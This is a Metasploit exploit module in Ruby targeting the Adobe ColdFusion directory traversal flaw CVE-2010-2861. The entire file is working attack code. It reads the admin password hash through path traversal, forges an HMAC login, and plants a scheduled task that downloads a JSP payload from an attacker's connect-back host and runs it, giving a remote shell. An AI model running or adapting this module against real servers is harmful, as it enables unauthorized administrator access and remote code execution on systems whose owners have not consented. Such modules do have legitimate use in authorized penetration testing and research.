##
# $Id: coldfusion_traversal.rb 11974 2011-03-16 01:38:16Z mc $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML
	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Adobe ColdFusion - Directory Traversal',
			'Description'    => %q{
					This module exploits a directory traversal bug in Adobe ColdFusion.
				By reading the password.properties a user can login using the encrypted 
				password itself. This should work on version 8 and below.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'webDEViL' ],
			'Version'        => '$Revision: 11974 $',
			'References'     =>
				[
					[ 'CVE', '2010-2861' ],
					[ 'URL', 'http://www.procheckup.com/vulnerability_manager/vulnerabilities/pr10-07' ],	
					[ 'URL', 'http://www.adobe.com/support/security/bulletins/apsb10-18.html' ],		
				],
			'Privileged'   	=> true,
			'Platform'      => ['linux','windows'],
			'Stance'       	=> Msf::Exploit::Stance::Aggressive,
			'Targets'       =>
				[
					[ 'Universal',
						{
							'Arch' => ARCH_JAVA,
							'Payload' => 'java'
						}
					],
				],

			'DisclosureDate' => 'Aug 25 2010',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('SHELL', [ true, "The system shell to use.", 'automatic']),
				OptString.new('URL',   [ true, 'Administrator Directory', '/CFIDE/administrator/' ]),
				OptString.new('CBIP',  [ true, 'Connect Back IP (even when not using reverse shell)', nil ]),
				OptString.new('TRAV',  [ false, 'Location of the password.properties file eg. ../../../../ColdFusion8/lib/password.properties%00en', nil ]),  
			], self.class)

	end
	
	def exploit
	
		ip = datastore['RHOST']
		url = datastore['URL']+"enter.cfm"
		locale = "?locale="
		trav = datastore['TRAV'] || "../../../../../../../../../../../../../../../../../../../../../../lib/password.properties%00en"
		datastore['JSP'] = "wD-"+rand_text_alphanumeric(6)+".jsp"
		datastore['URIPATH'] = rand_text_alphanumeric(6)
		
		print_status("Trying to acheive Directory Traversal...")
		while trav.match(/..\//im)
			res = send_request_raw({
				'uri'     => url+locale+trav,
				'method'  => 'GET',
				'headers' =>
					{
						'Connection' => "keep-alive",
						'Accept-Encoding' => "zip,deflate",
					},
				}, -1)
	
			if (res.nil?)
				print_error("no response for #{ip}:#{rport} #{url}")
			elsif (res.code == 200)
				#print_error("#{res.body}")#debug
				
				if match = res.body.match(/([0-9A-F]{40})/im);
					caphash = $1
					print_status("URL: #{ip}#{url}?locale=#{trav}")
					print_status("Admin Hash: " + caphash)
					break
				else
					#select(nil, nil, nil, 3)
					trav=trav[3..-1]
					print_status("Trav:"+trav)
					
				end
				
			else
				''
			end
		end
		
		if caphash.nil?
			print_error("Could not determine location of password.properties file, Set TRAV option manually")
			print_error("OR ColdFusion is not vulnerable")
			return
		end
		
		keyz = Time.now.to_i.to_s+"123"
		print_status("Time: "+ keyz)
		loghash= OpenSSL::HMAC.digest(OpenSSL::Digest::Digest.new('sha1'), keyz, caphash).unpack('H*')[0].upcase
		print_status("Login Hash: "+loghash)
		
		params =  'cfadminPassword='+loghash
		params << '&requestedURL=%2FCFIDE%2Fadministrator%2Fenter.cfm%3F&'
		params << 'salt='+keyz
		params << '&submit=Login'

		res = send_request_cgi({
			'method'    => 'POST',
			'uri'       => url,
			'data'  => params
		})

		if (res)
			#print_status("Me want Cookie: "+ res.headers['Set-Cookie'])
			if (res.headers['Set-Cookie'].match(/([A-Za-z0-9]{20,200})/im);)
				session = $1
				print_status("Cookie: #{session}")
			else
				print_error("Error retrieving cookie!")
			end
		else
			print_error("No response received while logging in.")
		end

		print_status("Attempting to automatically detect the platform...")
		##AUTO_DETECT START
		path = datastore['URL'] + 'settings/mappings.cfm'
		res = send_request_raw(
			{
				'uri'    => path,
				'headers' =>
					{
						'Cookie'     => "CFAUTHORIZATION_cfadmin=#{session}"
					}
			}, 20)

		if (not res) or (res.code != 200)
			print_error("Failed: Error requesting #{path}")
			return nil
		end

		if (res.body.match(/.*td *>(.*CFIDE&nbsp;)/im);)
			os = $1
			os.match(/<td [^>]*?>(.*)&nbsp/im);
			os1 =$1
			os1 = os1.gsub("\t", '')
			os1 = os1.gsub("\r\n", '')

			if (os1 =~ /:/i) #haha ;)
				print_status('OS: Windows')
				datastore['SHELL'] = 'cmd.exe'
				os1=os1+"\\"        
			else #(os1 =~ /\//i)
				print_status('OS: Linux')
				datastore['SHELL'] = '/bin/sh'
				os1=os1+"/"
			end
			print_status("Web Directory:"+os1)
		end

		##AUTO_DETECT END

		res = send_request_raw(
			{
				'uri'     => "/CFIDE/administrator/scheduler/scheduleedit.cfm?submit=Schedule+New+Task",
				'method'  => 'GET',
				'headers' =>
					{
						'Cookie'     => "CFAUTHORIZATION_cfadmin=#{session}",
					}
			}, 25)

		if (res.body.match(/<input name="StartTimeOnce".*?value="(.*?)">/im);)
			start_time = $1
		end

		if (res.body.match(/<input name="Start_Date".*?value="(.*?)" id="Start_Date">/im);)        
			start_date = $1
		end
		#else FAIL!
		comb = start_date + start_time
		fmt = "%b %d, %Y%I:%M %p"

		comb = ((DateTime.strptime(comb,fmt)).advance :minutes =>-19)
		t = comb.strftime("%b %d, %Y")
		t1 = comb.strftime("%I:%M %p")
		#t=(Time.now).strftime("%b %d, %Y") #can't use local time
		#t1=(Time.now + 5).strftime("%I:%M:%S %p")
		params =  'TaskName=wD-'+rand_text_alphanumeric(6)
		params << "&Start_Date=#{t}" #Mar+12%2C+2011
		params << '&End_Date=&ScheduleType=Once'
		params << "&StartTimeOnce=#{t1}" #6%3A40+PM
		params << ' &Interval=Daily&StartTimeDWM=&customInterval_hour=0&customInterval_min=0&customInterval_sec=0&CustomStartTime=&CustomEndTime=&Operation=HTTPRequest'
		params << '&ScheduledURL=http%3A%2F%2F'+datastore['CBIP']+":"+datastore['SRVPORT']+"/"+datastore['URIPATH']
		params << '&Username=&Password=&Request_Time_out=&proxy_server=&http_proxy_port=&publish=1'
		params << '&publish_file='+os1+datastore['JSP']
		params << '&adminsubmit=Submit&taskNameOrig='
		
		res = send_request_raw(
			{
				'uri'     => "/CFIDE/administrator/scheduler/scheduleedit.cfm",
				'method'  => 'POST',
				'data'    => params,
				'headers' =>
					{
						'Content-Type'   => 'application/x-www-form-urlencoded',
						'Content-Length' => params.length,
						'Cookie'     => "CFAUTHORIZATION_cfadmin=#{session}",
					}
			}, 25)
		#print_error("#{res.body}")
		super
	end	
		
	def on_request_uri(cli, request)
		p = regenerate_payload(cli)
		#print_status("SHELL set to #{datastore['SHELL']}")
		#print_status((p.encoded).to_s)
		
		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response(cli, p.encoded, { 'Content-Type' => 'text/html' })

		res = send_request_raw(
			{
				'uri'     => "/CFIDE/"+datastore['JSP'],
				'method'  => 'GET',
			}, 25)
		# Handle the payload
		handler(cli)
	end
end
